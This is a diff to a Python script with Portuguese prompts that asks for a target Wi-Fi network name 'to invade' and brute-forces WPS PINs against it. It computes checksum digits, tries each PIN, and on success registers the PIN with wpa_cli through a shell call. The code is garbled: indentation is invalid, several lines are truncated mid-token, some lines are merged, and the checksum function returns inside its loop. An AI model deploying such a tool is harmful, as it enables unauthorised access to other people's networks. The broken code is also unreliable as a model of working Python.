@@ -42,9 +42,6 @@ else:
     print(vermelho+"Nenhuma interface Wi-Fi encontrada.")
 time.sleep(1)
 print("\n")
-print(ciano+"Digite onde você deseja começar.")
-n=int(input(ciano+"["+magenta+"~"+ciano+"] "+magenta))
-s=str(n)
 print(ciano+"Qual o nome da rede que deseja invadir? ")
 ssid = input(ciano+"["+magenta+"~"+ciano+"] "+magenta)
 while True:
@@ -74,32 +71,30 @@ while True:
                pin2 = file.readlines()
                vx=str(pin1)+str(pin2)
                vy=int(vx)
-                   def calculate_wps_pin(last_digit):
-                       possible_digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
-                       combinations = itertools.product(range(10), repeat=7)
-                       for combination in combinations:
-                           if (sum(combination) * 3 + last_digit) % 10 == 0:
-                               pin = ''.join(str(digit) for digit in combination) + str(last_digit)
-                               return pin
-                           return None
-                   seven_digits = vy
-                       last_digit = calculate_wps_pin(int(seven_digits))
-                       lu=last_digit
+               def calculate_wps_pin(last_digit):
+                   possible_digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
+                   combinations = itertools.product(range(10), repeat=7)
+                   for combination in combinations:
+                       if (sum(combination) * 3 + last_digit) % 10 == 0:
+                           pin = ''.join(str(digit) for digit in combination) + str(la>
+                           return pin
+                       return None
+                    seven_digits = vy
+                    last_digit = calculate_wps_pin(int(seven_digits))
+                    lu=last_digit
                 px=vx+str(lu)
                 pin = int(px)
                 os.system("clear")
                 print("Testando PIN: "+ciano+pin)
                 result = connect_wifi(pin)
-                if "SUCCESS" in result:
-                    print(verde)
+                if "SUCCESS" in result:                                                                     print(verde)
                     print(f"Successo! PIN: {pin}")
                     def connect_to_wifi_with_wps_pin(pin):
                         command = f"wpa_cli -i wlan0 wps_reg {pin}"
-                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
+                        output = subprocess.run(command, shell=True, capture_output=Tru>
                         if output.returncode == 0:
-                            print(verde+"Conexão estabelecida com sucesso usando o PIN WPS!")
-                        else:
-                            print(vermelho+"Falha ao estabelecer a conexão usando o PIN WPS.")
+                            print(verde+"Conexão estabelecida com sucesso usando o PIN >
+                        else:                                                                                       print(vermelho+"Falha ao estabelecer a conexão usando o PIN>
                         connect_to_wifi_with_wps_pin(pin)
                 else:
                     print(amarelo+"PIN inválido")
